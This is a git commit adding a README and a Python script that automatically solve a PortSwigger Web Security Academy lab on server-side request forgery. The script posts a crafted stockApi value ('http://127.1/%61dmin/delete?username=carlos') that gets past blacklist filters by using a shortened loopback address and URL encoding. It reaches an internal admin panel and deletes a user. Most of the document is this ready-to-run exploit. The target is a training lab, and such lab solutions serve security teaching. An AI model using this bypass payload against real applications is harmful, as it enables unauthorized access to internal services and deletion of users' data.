4610206de18908828ac7bb52d157cc5c7ce66e43
Iman Ali <imanali194@gmail.com>
2024-10-15 12:45:12 -0700

    Add SSRF with blacklist-based input filter

---
+++ SSRF/SSRF with blacklist-based input filter/README.md
@@ -0,0 +1,10 @@
+## SSRF with blacklist-based input filter
+### Lab Scenario
+This lab has a stock check feature which fetches data from an internal system.
+To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
+The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
+
+### Instructions
+To solve this lab using the script:
+1. Access the lab here: `https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter`
+2. Run `python3 script.py <your lab URL>`. The script will solve the lab and delete the user `carlos`.
---
+++ SSRF/SSRF with blacklist-based input filter/script.py
@@ -0,0 +1,40 @@
+import requests
+import sys
+
+
+
+def delete_carlos_user(url):
+    try:
+        # Deleting Carlos user
+        requests.post(f"{url}/product/stock", data={"stockApi":  "http://127.1/%61dmin/delete?username=carlos"}, timeout=10)
+
+        # Verifying user has been deleted
+        response = requests.post(f"{url}/product/stock", data={"stockApi": "http://127.1/%61dmin/"}, timeout=10)
+        return "carlos" not in response.text and response.status_code == 200
+
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out. Please check your URL and try again.")
+        sys.exit(1)
+
+    except requests.exceptions.MissingSchema:
+        print(f"(-) Invalid URL.")
+        sys.exit(1)
+
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
+        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
+        sys.exit(1)
+
+
+    url = sys.argv[1].rstrip("/")
+    print("(+) Deleting Carlos user...")
+    if delete_carlos_user(url):
+        print("(+) Successfully deleted Carlos user!")
+    else:
+        print("(-) Carlos user was not successfully deleted. Please check your URL and try again.")
+
+
+if __name__ == "__main__":
+    main()
